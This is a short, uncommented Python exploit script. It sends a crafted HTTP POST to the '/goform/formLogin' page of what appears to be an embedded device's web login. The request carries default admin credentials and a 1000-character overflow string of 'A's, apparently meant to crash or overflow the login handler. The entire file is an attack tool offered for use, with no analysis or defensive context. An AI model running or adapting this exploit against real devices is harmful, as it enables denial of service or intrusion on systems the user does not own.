#!/usr/bin/python
import sys
import socket
host = sys.argv[1]
port  = int(sys.argv[2])
exploitstring = "A" * 1000
buf =  "POST http://" + host + "/goform/formLogin HTTP/1.1\r\n"
buf += "Host: " + host + "\r\n"
buf += "User-Agent: AAAAAAAAAAA\r\n"
buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf += "Accept-Language: en-us,en;q=0.5\r\n"
buf += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
buf += "Keep-Alive: 300\r\n"
buf += "Proxy-Connection: keep-alive\r\n"
buf += "Referer: http://" + host + "/index.asp\r\n"
buf += "Content-Type: application/x-www-form-urlencoded\r\n"
buf += "Content-Length: 678\r\n\r\n"
buf += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
buf += exploitstring + "\r\n"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buf)
s.recv(1024)
s.close()

